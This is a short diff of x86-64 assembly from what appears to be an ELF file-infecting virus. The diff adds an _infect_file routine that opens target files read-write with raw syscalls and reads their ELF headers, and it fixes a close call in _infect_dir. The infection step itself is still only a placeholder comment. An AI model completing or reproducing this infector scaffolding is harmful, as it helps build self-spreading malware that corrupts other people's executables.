@@ -215,6 +215,8 @@ _infect_dir:; (string rdi)
 			jmp .loop_in_dir
 
 	.close:
+		push r11
+		pop rdi
 		push 3
 		pop rax; close
 		syscall
@@ -237,10 +239,54 @@ _infect_dir:; (string rdi)
 ret
 
 _infect_file:
+	push r10
+	push r11
+
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
-	xor rax, rax
+	push 2
+	pop rax; open
+	push 0o0000002; O_RDWR
+	pop rsi
+	syscall
+	cmp rax, 0x0
+	jl .return; jump lower
+	push rdi
+	pop r10 ; path
+	push rax
+	pop r11 ; fd
+
+	sub rsp, 64 ; elf header size
+; check for elf header
+	push r11
+	pop rdi
+	mov rsi, rsp
+	push 64
+	pop rdx
+	xor rax, rax ; = 0
+	syscall
+	push rdi
+	pop r11
+	cmp rax, 64
+	jl .reset_stack
+
+	add rsp, 64
+	; things here
+	jmp .close
+	.reset_stack:
+		add rsp, 64
+	.close:
+		push r11
+		pop rdi
+		push 3
+		pop rax; close
+		syscall
+	.return:
+		xor rax, rax
+
+	pop r11
+	pop r10
 ret
 
 _host:
